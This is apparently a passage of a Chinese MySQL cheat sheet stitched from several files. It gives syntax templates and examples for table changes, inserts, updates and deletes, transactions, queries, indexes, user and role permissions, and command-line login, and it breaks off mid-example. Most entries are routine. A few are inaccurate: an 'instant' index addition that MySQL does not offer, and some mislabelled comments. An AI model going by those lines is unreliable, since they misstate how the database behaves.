**单行写法：查看当前库所有表**
`SHOW TABLES;`
```sql
-- 列出当前数据库的所有表
SHOW TABLES;
```

**单行写法：模糊查表**
`SHOW TABLES LIKE '<模式>';`
```sql
-- 模糊查询表名
SHOW TABLES LIKE '%user%';
```

---

## 修改表 ALTER TABLE

**单行写法：添加列**
`ALTER TABLE <表名> ADD COLUMN <列定义> [AFTER <列名>];`
```sql
-- 在 email 列后添加新列
ALTER TABLE users ADD COLUMN phone VARCHAR(20) AFTER email;
```

**单行写法：快速添加列（8.0.12+ INSTANT）**
`ALTER TABLE <表名> ADD COLUMN <列定义>, ALGORITHM=INSTANT;`
```sql
-- 即时添加列，不修改数据行
ALTER TABLE users ADD COLUMN nickname VARCHAR(50), ALGORITHM=INSTANT;
```

**单行写法：修改列定义**
`ALTER TABLE <表名> MODIFY COLUMN <列名> <新类型> [<约束>];`
```sql
-- 修改列类型并加约束
ALTER TABLE users MODIFY COLUMN phone VARCHAR(20) NOT NULL;
```

**单行写法：重命名列**
`ALTER TABLE <表名> CHANGE COLUMN <旧列名> <新列名> <类型> [<约束>];`
```sql
-- 重命名列并保留类型
ALTER TABLE users CHANGE COLUMN phone telephone VARCHAR(20) NOT NULL;
```

**单行写法：删除列**
`ALTER TABLE <表名> DROP COLUMN <列名>;`
```sql
-- 删除指定列
ALTER TABLE users DROP COLUMN nickname;
```

**单行写法：重命名表**
`ALTER TABLE <旧表名> RENAME TO <新表名>;`
```sql
-- 重命名表
ALTER TABLE users RENAME TO user_info;
```

**单行写法：多表重命名**
`RENAME TABLE <旧1> TO <新1>, <旧2> TO <新2>;`
```sql
-- 同时重命名多个表
RENAME TABLE users TO user_info, orders TO order_info;
```

---

## 约束管理

**单行写法：添加主键**
`ALTER TABLE <表名> ADD PRIMARY KEY (<列名>);`
```sql
-- 添加主键约束
ALTER TABLE users ADD PRIMARY KEY (id);
```

**单行写法：添加唯一约束**
`ALTER TABLE <表名> ADD UNIQUE INDEX <索引名> (<列名>);`
```sql
-- 添加唯一约束
ALTER TABLE users ADD UNIQUE INDEX uk_email (email);
```

**单行写法：添加外键**
`ALTER TABLE <表名> ADD CONSTRAINT <约束名> FOREIGN KEY (<列名>) REFERENCES <父表>(<父列>) [ON DELETE <动作>] [ON UPDATE <动作>];`
```sql
-- 添加外键并设置级联更新
ALTER TABLE orders ADD CONSTRAINT fk_user_id
  FOREIGN KEY (user_id) REFERENCES users(id)
  ON DELETE RESTRICT ON UPDATE CASCADE;
```

**单行写法：添加 CHECK 约束（8.0.16+）**
`ALTER TABLE <表名> ADD CONSTRAINT <约束名> CHECK (<条件>);`
```sql
-- 添加检查约束
ALTER TABLE users ADD CONSTRAINT chk_age CHECK (age >= 0 AND age < 150);
```

**单行写法：删除外键**
`ALTER TABLE <表名> DROP FOREIGN KEY <约束名>;`
```sql
-- 删除外键约束
ALTER TABLE orders DROP FOREIGN KEY fk_user_id;
```

**单行写法：删除主键**
`ALTER TABLE <表名> DROP PRIMARY KEY;`
```sql
-- 删除主键约束
ALTER TABLE users DROP PRIMARY KEY;
```

---

## 删除表与清空

**单行写法：删除表**
`DROP TABLE [IF EXISTS] <表名>[, <表名>...];`
```sql
-- 同时删除多个表
DROP TABLE IF EXISTS users, orders, products;
```

**单行写法：清空表数据**
`TRUNCATE TABLE <表名>;`
```sql
-- 清空表数据并重置自增ID
TRUNCATE TABLE users;
```

---

## 视图

**换行写法：创建视图**
`CREATE [OR REPLACE] VIEW <视图名> AS <SELECT 语句>;`
```sql
-- 创建或替换活跃用户视图
CREATE OR REPLACE VIEW active_users AS
SELECT id, username, email FROM users WHERE status = 1;
```

**单行写法：删除视图**
`DROP VIEW [IF EXISTS] <视图名>;`
```sql
-- 删除视图
DROP VIEW IF EXISTS active_users;
```

<!-- ============ 文档分隔线：020-mysql/083-DML.md ============ -->

## INSERT 插入

**单行写法：插入单行**
`INSERT INTO <表名> (<列1>, <列2>) VALUES (<值1>, <值2>);`
```sql
-- 插入一条用户记录
INSERT INTO users (username, email, age) VALUES ('zhangsan', 'zs@example.com', 25);
```

**单行写法：插入所有列**
`INSERT INTO <表名> VALUES (<值1>, <值2>, ...);`
```sql
-- 按列顺序插入所有列
INSERT INTO users VALUES (NULL, 'lisi', 'ls@example.com', 30, 0.00, 1, NOW(), NOW());
```

**换行写法：插入多行**
`INSERT INTO <表名> (<列>) VALUES (<值1>), (<值2>), (<值3>);`
```sql
-- 批量插入多行数据
INSERT INTO users (username, email) VALUES
  ('user1', 'u1@example.com'),
  ('user2', 'u2@example.com'),
  ('user3', 'u3@example.com');
```

**单行写法：插入查询结果**
`INSERT INTO <目标表> SELECT * FROM <源表> [WHERE <条件>];`
```sql
-- 将活跃用户插入备份表
INSERT INTO active_users_backup SELECT * FROM users WHERE status = 1;
```

**换行写法：插入时使用 ON DUPLICATE KEY UPDATE**
`INSERT INTO <表名> (<列>) VALUES (<值>) ON DUPLICATE KEY UPDATE <列>=<值>;`
```sql
-- 主键或唯一键冲突时更新
INSERT INTO users (id, username, email) VALUES (1, 'zhangsan', 'new@example.com')
ON DUPLICATE KEY UPDATE email = VALUES(email), updated_at = NOW();
```

**换行写法：INSERT ... IGNORE 忽略冲突**
`INSERT IGNORE INTO <表名> (<列>) VALUES (<值>);`
```sql
-- 主键冲突时忽略不报错
INSERT IGNORE INTO users (id, username) VALUES (1, 'zhangsan');
```

**单行写法：REPLACE 替换插入**
`REPLACE INTO <表名> (<列>) VALUES (<值>);`
```sql
-- 冲突时先删除旧行再插入新行
REPLACE INTO users (id, username, email) VALUES (1, 'zhangsan', 'new@example.com');
```

---

## UPDATE 更新

**单行写法：更新单列**
`UPDATE <表名> SET <列>=<值> WHERE <条件>;`
```sql
-- 更新指定用户的年龄
UPDATE users SET age = 26 WHERE id = 1;
```

**单行写法：更新多列**
`UPDATE <表名> SET <列1>=<值1>, <列2>=<值2> WHERE <条件>;`
```sql
-- 同时更新多个字段
UPDATE users SET age = 26, status = 2 WHERE id = 1;
```

**单行写法：基于表达式更新**
`UPDATE <表名> SET <列>=<表达式> WHERE <条件>;`
```sql
-- 所有用户余额增加 10%
UPDATE users SET balance = balance * 1.10 WHERE status = 1;
```

**换行写法：基于 JOIN 更新**
`UPDATE <表1> JOIN <表2> ON <条件> SET <列>=<值>;`
```sql
-- 关联订单表更新用户总消费
UPDATE users u
JOIN (SELECT user_id, SUM(total_amount) AS total FROM orders GROUP BY user_id) o
  ON u.id = o.user_id
SET u.balance = u.balance - o.total;
```

**单行写法：使用 LIMIT 限制更新行数**
`UPDATE <表名> SET <列>=<值> WHERE <条件> LIMIT <数量>;`
```sql
-- 仅更新前 100 条匹配记录
UPDATE users SET status = 0 WHERE last_login < '2024-01-01' LIMIT 100;
```

**单行写法：使用 CASE 条件更新**
`UPDATE <表名> SET <列> = CASE <条件列> WHEN <值1> THEN <结果1> ELSE <结果2> END WHERE <条件>;`
```sql
-- 根据不同状态批量更新
UPDATE users SET status = CASE age
  WHEN 18 THEN 1
  WHEN 30 THEN 2
  ELSE status
END WHERE age IN (18, 30);
```

---

## DELETE 删除

**单行写法：按条件删除**
`DELETE FROM <表名> WHERE <条件>;`
```sql
-- 删除指定用户
DELETE FROM users WHERE id = 1;
```

**单行写法：限制删除行数**
`DELETE FROM <表名> WHERE <条件> LIMIT <数量>;`
```sql
-- 仅删除前 100 条匹配记录
DELETE FROM logs WHERE created_at < '2024-01-01' LIMIT 100;
```

**换行写法：基于 JOIN 删除**
`DELETE <别名> FROM <表1> <别名> JOIN <表2> ON <条件> WHERE <条件>;`
```sql
-- 删除没有订单的用户
DELETE u FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE o.id IS NULL;
```

**换行写法：多表关联删除**
`DELETE <表1>, <表2> FROM <表1> JOIN <表2> ON <条件> WHERE <条件>;`
```sql
-- 同时删除用户和其订单
DELETE u, o FROM users u
JOIN orders o ON u.id = o.user_id
WHERE u.id = 1;
```

**单行写法：删除所有数据**
`DELETE FROM <表名>;`
```sql
-- 删除全表数据（保留自增ID计数）
DELETE FROM users;
```

---

## UPSERT 与冲突处理

**换行写法：VALUES() 函数引用插入值**
`INSERT INTO <表> (<列>) VALUES (<值>) ON DUPLICATE KEY UPDATE <列>=VALUES(<列>);`
```sql
-- 冲突时引用待插入值更新
INSERT INTO counters (id, count) VALUES (1, 1)
ON DUPLICATE KEY UPDATE count = count + VALUES(count);
```

**换行写法：MySQL 8.0.20+ 使用别名引用**
`INSERT INTO <表> (<列>) VALUES (<值>) AS <别名> ON DUPLICATE KEY UPDATE <列>=<别名>.<列>;`
```sql
-- 8.0.20+ 使用别名替代 VALUES()
INSERT INTO counters (id, count) VALUES (1, 1) AS new
ON DUPLICATE KEY UPDATE count = counters.count + new.count;
```

---

## 事务控制

**单行写法：开启事务**
`START TRANSACTION;` 或 `BEGIN;`
```sql
-- 开启事务
START TRANSACTION;
```

**换行写法：提交事务**
`COMMIT;`
```sql
-- 提交事务持久化变更
START TRANSACTION;
UPDATE accounts SET balance = balance - 100 WHERE user_id = 1;
UPDATE accounts SET balance = balance + 100 WHERE user_id = 2;
COMMIT;
```

**单行写法：回滚事务**
`ROLLBACK;`
```sql
-- 回滚撤销事务变更
ROLLBACK;
```

**单行写法：设置保存点**
`SAVEPOINT <保存点名>;`
```sql
-- 设置保存点
SAVEPOINT sp1;
```

**单行写法：回滚到保存点**
`ROLLBACK TO <保存点名>;`
```sql
-- 回滚到指定保存点
ROLLBACK TO sp1;
```

**单行写法：查看隔离级别**
`SELECT @@transaction_isolation;`
```sql
-- 查看当前事务隔离级别
SELECT @@transaction_isolation;
```

**单行写法：设置隔离级别**
`SET SESSION TRANSACTION ISOLATION LEVEL <级别>;`
```sql
-- 设置会话隔离级别为读已提交
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
```

<!-- ============ 文档分隔线：020-mysql/084-DQL.md ============ -->

## SELECT 基础

**单行写法：查询所有列**
`SELECT * FROM <表名>;`
```sql
-- 查询所有用户
SELECT * FROM users;
```

**单行写法：查询指定列**
`SELECT <列1>, <列2> FROM <表名>;`
```sql
-- 查询用户名和邮箱
SELECT username, email FROM users;
```

**单行写法：列别名**
`SELECT <列> AS <别名> FROM <表名>;`
```sql
-- 给列起别名
SELECT username AS 用户名, email AS 邮箱 FROM users;
```

**单行写法：去重查询**
`SELECT DISTINCT <列> FROM <表名>;`
```sql
-- 查询不重复的城市
SELECT DISTINCT city FROM users;
```

**单行写法：限制列数预览**
`SELECT * FROM <表名> LIMIT <数量>;`
```sql
-- 仅查看前 5 行
SELECT * FROM users LIMIT 5;
```

---

## WHERE 条件

**单行写法：等值条件**
`SELECT * FROM <表名> WHERE <列>=<值>;`
```sql
-- 查询状态为 1 的用户
SELECT * FROM users WHERE status = 1;
```

**单行写法：多条件 AND**
`SELECT * FROM <表名> WHERE <条件1> AND <条件2>;`
```sql
-- 查询活跃且成年的用户
SELECT * FROM users WHERE status = 1 AND age >= 18;
```

**单行写法：多条件 OR**
`SELECT * FROM <表名> WHERE <条件1> OR <条件2>;`
```sql
-- 查询北京或上海的用户
SELECT * FROM users WHERE city = '北京' OR city = '上海';
```

**单行写法：IN 范围查询**
`SELECT * FROM <表名> WHERE <列> IN (<值1>, <值2>);`
```sql
-- 查询指定状态的用户
SELECT * FROM users WHERE status IN (1, 2, 3);
```

**单行写法：BETWEEN 范围查询**
`SELECT * FROM <表名> WHERE <列> BETWEEN <起> AND <止>;`
```sql
-- 查询年龄在 18 到 30 之间的用户
SELECT * FROM users WHERE age BETWEEN 18 AND 30;
```

**单行写法：LIKE 模糊查询**
`SELECT * FROM <表名> WHERE <列> LIKE '<模式>';`
```sql
-- 查询姓张的用户
SELECT * FROM users WHERE username LIKE '张%';
```

**单行写法：IS NULL 空值查询**
`SELECT * FROM <表名> WHERE <列> IS NULL;`
```sql
-- 查询手机号为空的用户
SELECT * FROM users WHERE phone IS NULL;
```

**单行写法：IS NOT NULL 非空查询**
`SELECT * FROM <表名> WHERE <列> IS NOT NULL;`
```sql
-- 查询已填写邮箱的用户
SELECT * FROM users WHERE email IS NOT NULL;
```

**单行写法：NOT IN 反向查询**
`SELECT * FROM <表名> WHERE <列> NOT IN (<值1>, <值2>);`
```sql
-- 查询非指定状态的用户
SELECT * FROM users WHERE status NOT IN (0, 9);
```

---

## ORDER BY 排序

**单行写法：升序排序**
`SELECT * FROM <表名> ORDER BY <列> ASC;`
```sql
-- 按年龄升序排列
SELECT * FROM users ORDER BY age ASC;
```

**单行写法：降序排序**
`SELECT * FROM <表名> ORDER BY <列> DESC;`
```sql
-- 按创建时间降序排列
SELECT * FROM users ORDER BY created_at DESC;
```

**单行写法：多列排序**
`SELECT * FROM <表名> ORDER BY <列1> DESC, <列2> ASC;`
```sql
-- 先按状态降序，再按年龄升序
SELECT * FROM users ORDER BY status DESC, age ASC;
```

**单行写法：按表达式排序**
`SELECT * FROM <表名> ORDER BY <表达式>;`
```sql
-- 按余额绝对值排序
SELECT * FROM accounts ORDER BY ABS(balance);
```

---

## LIMIT 分页

**单行写法：限制返回行数**
`SELECT * FROM <表名> LIMIT <数量>;`
```sql
-- 仅返回前 10 条
SELECT * FROM users LIMIT 10;
```

**单行写法：分页查询**
`SELECT * FROM <表名> LIMIT <偏移量>, <数量>;`
```sql
-- 查询第 3 页每页 10 条
SELECT * FROM users LIMIT 20, 10;
```

**单行写法：OFFSET 写法**
`SELECT * FROM <表名> LIMIT <数量> OFFSET <偏移量>;`
```sql
-- 使用 OFFSET 关键字分页
SELECT * FROM users LIMIT 10 OFFSET 20;
```

**换行写法：深度分页优化**
`SELECT * FROM <表名> WHERE <主键> > <上次最大值> ORDER BY <主键> LIMIT <数量>;`
```sql
-- 基于主键游标分页避免深度分页性能问题
SELECT id, username FROM users WHERE id > 10000 ORDER BY id LIMIT 10;
```

---

## 运算符与函数

**单行写法：算术运算**
`SELECT <列1> + <列2> AS <别名> FROM <表名>;`
```sql
-- 计算总价
SELECT price * quantity AS total FROM order_items;
```

**单行写法：日期比较**
`SELECT * FROM <表名> WHERE <日期列> > <日期值>;`
```sql
-- 查询 2024 年后的订单
SELECT * FROM orders WHERE created_at > '2024-01-01';
```

**单行写法：字符串拼接**
`SELECT CONCAT(<列1>, <列2>) AS <别名> FROM <表名>;`
```sql
-- 拼接用户姓名
SELECT CONCAT(first_name, ' ', last_name) AS full_name FROM users;
```

**单行写法：使用 IF 函数**
`SELECT IF(<条件>, <真值>, <假值>) FROM <表名>;`
```sql
-- 根据状态返回文本
SELECT username, IF(status = 1, '活跃', '禁用') AS state FROM users;
```

**换行写法：CASE 表达式**
`CASE WHEN <条件> THEN <结果> ELSE <默认> END`
```sql
-- 多条件分支判断
SELECT username,
  CASE
    WHEN age < 18 THEN '未成年'
    WHEN age < 60 THEN '成年'
    ELSE '老年'
  END AS age_group
FROM users;
```

---

## 子查询

**单行写法：标量子查询**
`SELECT * FROM <表名> WHERE <列> = (SELECT <列> FROM <表名> WHERE <条件>);`
```sql
-- 查询年龄大于平均年龄的用户
SELECT * FROM users WHERE age > (SELECT AVG(age) FROM users);
```

**单行写法：IN 子查询**
`SELECT * FROM <表名> WHERE <列> IN (SELECT <列> FROM <表名>);`
```sql
-- 查询有订单的用户
SELECT * FROM users WHERE id IN (SELECT user_id FROM orders);
```

**单行写法：EXISTS 子查询**
`SELECT * FROM <表1> WHERE EXISTS (SELECT 1 FROM <表2> WHERE <条件>);`
```sql
-- 查询存在订单的用户
SELECT * FROM users u WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id);
```

**换行写法：NOT EXISTS 子查询**
`SELECT * FROM <表1> WHERE NOT EXISTS (SELECT 1 FROM <表2> WHERE <条件>);`
```sql
-- 查询没有订单的用户
SELECT * FROM users u WHERE NOT EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id);
```

<!-- ============ 文档分隔线：020-mysql/085-IndexManagement.md ============ -->

## 创建索引

**单行写法：创建普通索引**
`CREATE INDEX <索引名> ON <表名>(<列名>[, <列名>...]);`
```sql
-- 在 email 列上创建索引
CREATE INDEX idx_email ON users(email);
```

**单行写法：创建复合索引**
`CREATE INDEX <索引名> ON <表名>(<列1>, <列2>[, ...]);`
```sql
-- 创建多列复合索引
CREATE INDEX idx_status_created ON orders(status, created_at);
```

**单行写法：创建唯一索引**
`CREATE UNIQUE INDEX <索引名> ON <表名>(<列名>);`
```sql
-- 创建唯一索引
CREATE UNIQUE INDEX uk_email ON users(email);
```

**单行写法：创建前缀索引**
`CREATE INDEX <索引名> ON <表名>(<列名>(<长度>));`
```sql
-- 为长字符串列创建前缀索引
CREATE INDEX idx_name_prefix ON users(username(10));
```

**换行写法：创建全文索引**
`ALTER TABLE <表名> ADD FULLTEXT INDEX <索引名> (<列名>[, ...]);`
```sql
-- 为文章标题和内容创建全文索引
ALTER TABLE articles ADD FULLTEXT INDEX ft_content (title, content);
```

**换行写法：创建函数索引（8.0.13+）**
`CREATE INDEX <索引名> ON <表名>((<表达式>));`
```sql
-- 为列的小写形式创建函数索引
CREATE INDEX idx_lower_email ON users((LOWER(email)));
```

**换行写法：创建降序索引（8.0+）**
`CREATE INDEX <索引名> ON <表名>(<列> DESC);`
```sql
-- 创建降序索引优化倒序查询
CREATE INDEX idx_created_desc ON orders(created_at DESC);
```

---

## ALTER TABLE 管理索引

**单行写法：添加普通索引**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列名>);`
```sql
-- 添加普通索引
ALTER TABLE users ADD INDEX idx_age (age);
```

**单行写法：添加唯一索引**
`ALTER TABLE <表名> ADD UNIQUE INDEX <索引名> (<列名>);`
```sql
-- 添加唯一索引
ALTER TABLE users ADD UNIQUE INDEX uk_phone (phone);
```

**单行写法：添加主键**
`ALTER TABLE <表名> ADD PRIMARY KEY (<列名>);`
```sql
-- 添加主键
ALTER TABLE users ADD PRIMARY KEY (id);
```

**单行写法：设置不可见索引（8.0+）**
`ALTER TABLE <表名> ALTER INDEX <索引名> INVISIBLE;`
```sql
-- 隐藏索引用于测试删除影响
ALTER TABLE users ALTER INDEX idx_age INVISIBLE;
```

**单行写法：恢复可见索引**
`ALTER TABLE <表名> ALTER INDEX <索引名> VISIBLE;`
```sql
-- 恢复索引可见
ALTER TABLE users ALTER INDEX idx_age VISIBLE;
```

---

## 查看索引

**单行写法：查看表索引**
`SHOW INDEX FROM <表名>;`
```sql
-- 查看 users 表的索引
SHOW INDEX FROM users;
```

**单行写法：查看表索引带库名**
`SHOW INDEX FROM <表名> FROM <库名>;`
```sql
-- 查看指定库的表索引
SHOW INDEX FROM users FROM mydb;
```

**单行写法：查看建表语句含索引**
`SHOW CREATE TABLE <表名>;`
```sql
-- 查看建表语句中包含的索引定义
SHOW CREATE TABLE users;
```

---

## 删除索引

**单行写法：DROP INDEX 删除**
`DROP INDEX <索引名> ON <表名>;`
```sql
-- 删除指定索引
DROP INDEX idx_email ON users;
```

**单行写法：ALTER 删除索引**
`ALTER TABLE <表名> DROP INDEX <索引名>;`
```sql
-- 通过 ALTER 删除索引
ALTER TABLE users DROP INDEX idx_age;
```

**单行写法：删除主键**
`ALTER TABLE <表名> DROP PRIMARY KEY;`
```sql
-- 删除主键索引
ALTER TABLE users DROP PRIMARY KEY;
```

**单行写法：删除全文索引**
`ALTER TABLE <表名> DROP INDEX <索引名>;`
```sql
-- 删除全文索引
ALTER TABLE articles DROP INDEX ft_content;
```

---

## 索引分析

**单行写法：查看执行计划**
`EXPLAIN SELECT <列> FROM <表名> WHERE <条件>;`
```sql
-- 查看查询执行计划
EXPLAIN SELECT * FROM users WHERE email = 'test@example.com';
```

**单行写法：分析执行计划**
`EXPLAIN ANALYZE SELECT <列> FROM <表名> WHERE <条件>;`
```sql
-- 8.0.18+ 显示实际执行耗时
EXPLAIN ANALYZE SELECT * FROM users WHERE status = 1;
```

**单行写法：查看索引使用情况**
`SELECT * FROM sys.schema_index_statistics WHERE table_schema = '<库名>';`
```sql
-- 查看索引的读写统计
SELECT * FROM sys.schema_index_statistics
WHERE table_schema = 'mydb' AND table_name = 'users';
```

**单行写法：查看未使用的索引**
`SELECT * FROM sys.schema_unused_indexes WHERE object_schema = '<库名>';`
```sql
-- 查找从未被使用的索引
SELECT * FROM sys.schema_unused_indexes WHERE object_schema = 'mydb';
```

---

## 索引维护

**单行写法：分析表更新统计**
`ANALYZE TABLE <表名>;`
```sql
-- 重新分析表统计信息
ANALYZE TABLE users;
```

**单行写法：检查表**
`CHECK TABLE <表名>;`
```sql
-- 检查表是否有错误
CHECK TABLE users;
```

**单行写法：优化表**
`OPTIMIZE TABLE <表名>;`
```sql
-- 优化表回收空间
OPTIMIZE TABLE users;
```

**单行写法：在线添加索引**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列>), ALGORITHM=INPLACE, LOCK=NONE;`
```sql
-- 在线添加索引不阻塞读写
ALTER TABLE users ADD INDEX idx_nickname (nickname), ALGORITHM=INPLACE, LOCK=NONE;
```

**单行写法：即时添加列索引（8.0.12+）**
`ALTER TABLE <表名> ADD INDEX <索引名> (<列>), ALGORITHM=INSTANT;`
```sql
-- 即时操作不影响数据
ALTER TABLE users ADD INDEX idx_status (status), ALGORITHM=INSTANT;
```

---

## 索引设计原则

**单行写法：复合索引最左前缀**
`CREATE INDEX <索引名> ON <表名>(<高频列>, <范围列>);`
```sql
-- 高频等值列在前，范围列在后
CREATE INDEX idx_status_age ON users(status, age);
```

**单行写法：覆盖索引避免回表**
`CREATE INDEX <索引名> ON <表名>(<列1>, <列2>);`
```sql
-- 索引包含查询所需所有列
CREATE INDEX idx_cover ON orders(user_id, status, total_amount);
```

**单行写法：使用 EXPLAIN 验证类型**
`EXPLAIN SELECT <列> FROM <表名> WHERE <条件>;`
```sql
-- 检查 type 列是否为 ref 或 eq_ref
EXPLAIN SELECT * FROM users WHERE email = 'test@example.com';
```

<!-- ============ 文档分隔线：020-mysql/086-UserPermission.md ============ -->

## 用户管理

**单行写法：创建用户**
`CREATE USER '<用户名>'@'<主机>' IDENTIFIED BY '<密码>';`
```sql
-- 创建本地用户
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'StrongPass123!';
```

**单行写法：创建远程用户**
`CREATE USER '<用户名>'@'%' IDENTIFIED BY '<密码>';`
```sql
-- 允许从任意主机连接
CREATE USER 'appuser'@'%' IDENTIFIED BY 'StrongPass123!';
```

**换行写法：指定认证插件（8.0+ 默认）**
`CREATE USER '<用户名>'@'<主机>' IDENTIFIED WITH caching_sha2_password BY '<密码>';`
```sql
-- 使用默认 caching_sha2_password 认证插件
CREATE USER 'secure_user'@'%' IDENTIFIED WITH caching_sha2_password BY 'StrongPass123!';
```

**换行写法：使用 mysql_native_password 认证**
`CREATE USER '<用户名>'@'<主机>' IDENTIFIED WITH mysql_native_password BY '<密码>';`
```sql
-- 兼容旧客户端的认证方式
CREATE USER 'legacy_user'@'%' IDENTIFIED WITH mysql_native_password BY 'StrongPass123!';
```

**单行写法：修改用户密码**
`ALTER USER '<用户名>'@'<主机>' IDENTIFIED BY '<新密码>';`
```sql
-- 修改用户密码
ALTER USER 'appuser'@'localhost' IDENTIFIED BY 'NewPass456!';
```

**单行写法：修改当前用户密码**
`ALTER USER USER() IDENTIFIED BY '<新密码>';`
```sql
-- 修改当前登录用户密码
ALTER USER USER() IDENTIFIED BY 'NewPass456!';
```

**单行写法：锁定用户**
`ALTER USER '<用户名>'@'<主机>' ACCOUNT LOCK;`
```sql
-- 锁定用户禁止登录
ALTER USER 'appuser'@'localhost' ACCOUNT LOCK;
```

**单行写法：解锁用户**
`ALTER USER '<用户名>'@'<主机>' ACCOUNT UNLOCK;`
```sql
-- 解锁用户
ALTER USER 'appuser'@'localhost' ACCOUNT UNLOCK;
```

**单行写法：设置密码过期**
`ALTER USER '<用户名>'@'<主机>' PASSWORD EXPIRE;`
```sql
-- 强制用户下次登录修改密码
ALTER USER 'appuser'@'localhost' PASSWORD EXPIRE;
```

**单行写法：删除用户**
`DROP USER [IF EXISTS] '<用户名>'@'<主机>';`
```sql
-- 删除用户
DROP USER IF EXISTS 'appuser'@'localhost';
```

**单行写法：重命名用户**
`RENAME USER '<旧名>'@'<主机>' TO '<新名>'@'<主机>';`
```sql
-- 重命名用户
RENAME USER 'appuser'@'localhost' TO 'webapp'@'localhost';
```

---

## 查看用户

**单行写法：查看所有用户**
`SELECT User, Host FROM mysql.user;`
```sql
-- 列出所有用户
SELECT User, Host FROM mysql.user;
```

**单行写法：查看当前用户**
`SELECT CURRENT_USER();`
```sql
-- 查看当前登录用户
SELECT CURRENT_USER();
```

**换行写法：查看用户权限**
`SHOW GRANTS FOR '<用户名>'@'<主机>';`
```sql
-- 查看指定用户权限
SHOW GRANTS FOR 'appuser'@'localhost';
```

**单行写法：查看当前用户权限**
`SHOW GRANTS;`
```sql
-- 查看当前登录用户权限
SHOW GRANTS;
```

---

## 权限授予与回收

**单行写法：授予所有权限**
`GRANT ALL PRIVILEGES ON <库>.<表> TO '<用户名>'@'<主机>';`
```sql
-- 授予某库所有表的所有权限
GRANT ALL PRIVILEGES ON mydb.* TO 'appuser'@'localhost';
```

**单行写法：授予指定权限**
`GRANT SELECT, INSERT, UPDATE ON <库>.<表> TO '<用户名>'@'<主机>';`
```sql
-- 授予增删改查权限
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.users TO 'appuser'@'localhost';
```

**单行写法：授予全局权限**
`GRANT <权限> ON *.* TO '<用户名>'@'<主机>';`
```sql
-- 授予全局 CREATE 权限
GRANT CREATE ON *.* TO 'appuser'@'localhost';
```

**单行写法：授予并允许授权**
`GRANT <权限> ON <库>.<表> TO '<用户>'@'<主机>' WITH GRANT OPTION;`
```sql
-- 授予权限并允许该用户授权给他人
GRANT SELECT ON mydb.* TO 'admin'@'localhost' WITH GRANT OPTION;
```

**单行写法：回收权限**
`REVOKE <权限> ON <库>.<表> FROM '<用户名>'@'<主机>';`
```sql
-- 回收删除权限
REVOKE DELETE ON mydb.users FROM 'appuser'@'localhost';
```

**单行写法：回收所有权限**
`REVOKE ALL PRIVILEGES ON <库>.<表> FROM '<用户名>'@'<主机>';`
```sql
-- 回收某库所有权限
REVOKE ALL PRIVILEGES ON mydb.* FROM 'appuser'@'localhost';
```

**单行写法：刷新权限**
`FLUSH PRIVILEGES;`
```sql
-- 直接修改 user 表后刷新权限
FLUSH PRIVILEGES;
```

---

## 常用权限列表

**单行写法：授予 DML 权限**
`GRANT SELECT, INSERT, UPDATE, DELETE ON <库>.* TO '<用户>'@'<主机>';`
```sql
-- 授予数据操作权限
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'appuser'@'%';
```

**单行写法：授予 DDL 权限**
`GRANT CREATE, ALTER, DROP, INDEX ON <库>.* TO '<用户>'@'<主机>';`
```sql
-- 授予数据定义权限
GRANT CREATE, ALTER, DROP, INDEX ON mydb.* TO 'devuser'@'%';
```

**单行写法：授予只读权限**
`GRANT SELECT ON <库>.* TO '<用户>'@'<主机>';`
```sql
-- 授予只读权限
GRANT SELECT ON mydb.* TO 'readonly'@'%';
```

**单行写法：授予备份权限**
`GRANT SELECT, LOCK TABLES, RELOAD, REPLICATION CLIENT ON *.* TO '<用户>'@'<主机>';`
```sql
-- 授予 mysqldump 所需权限
GRANT SELECT, LOCK TABLES, RELOAD, REPLICATION CLIENT ON *.* TO 'backup'@'localhost';
```

---

## 角色管理（8.0+）

**单行写法：创建角色**
`CREATE ROLE '<角色名>';`
```sql
-- 创建角色
CREATE ROLE 'app_read';
```

**单行写法：给角色授权**
`GRANT SELECT ON <库>.* TO '<角色名>';`
```sql
-- 给角色授予只读权限
GRANT SELECT ON mydb.* TO 'app_read';
```

**单行写法：将角色授予用户**
`GRANT '<角色名>' TO '<用户名>'@'<主机>';`
```sql
-- 把角色分配给用户
GRANT 'app_read' TO 'appuser'@'localhost';
```

**单行写法：设置默认角色**
`SET DEFAULT ROLE '<角色名>' TO '<用户名>'@'<主机>';`
```sql
-- 设置用户登录后默认激活的角色
SET DEFAULT ROLE 'app_read' TO 'appuser'@'localhost';
```

**单行写法：激活当前角色**
`SET ROLE '<角色名>';`
```sql
-- 当前会话激活指定角色
SET ROLE 'app_read';
```

**单行写法：查看当前角色**
`SELECT CURRENT_ROLE();`
```sql
-- 查看当前激活的角色
SELECT CURRENT_ROLE();
```

**单行写法：回收角色**
`REVOKE '<角色名>' FROM '<用户名>'@'<主机>';`
```sql
-- 从用户回收角色
REVOKE 'app_read' FROM 'appuser'@'localhost';
```

**单行写法：删除角色**
`DROP ROLE [IF EXISTS] '<角色名>';`
```sql
-- 删除角色
DROP ROLE IF EXISTS 'app_read';
```

---

## 密码策略

**单行写法：查看密码策略**
`SHOW VARIABLES LIKE 'validate_password%';`
```sql
-- 查看密码验证插件配置
SHOW VARIABLES LIKE 'validate_password%';
```

**单行写法：设置密码长度**
`SET GLOBAL validate_password.length = <数值>;`
```sql
-- 设置最小密码长度
SET GLOBAL validate_password.length = 12;
```

**单行写法：设置密码复杂度**
`SET GLOBAL validate_password.policy = <级别>;`
```sql
-- 设置密码策略为中等
SET GLOBAL validate_password.policy = 'MEDIUM';
```

<!-- ============ 文档分隔线：020-mysql/087-CLI.md ============ -->

## 连接登录

**单行写法：本地连接**
`mysql -u <用户名> -p`
```bash
# 交互式输入密码登录
mysql -u root -p
```

**单行写法：指定密码连接**
`mysql -u <用户名> -p<密码>`
```bash
# 直接在命令中带密码（不推荐，会泄露）
mysql -u root -pStrongPass123!
```

**单行写法：连接远程主机**
`mysql -h <主机> -P <端口> -u <用户名> -p`
```bash
# 连接远程 MySQL 服务器
mysql -h 192.168.1.100 -P 3306 -u appuser -p
```

**单行写法：指定数据库连接**
`mysql -u <用户名> -p <数据库名>`
```bash
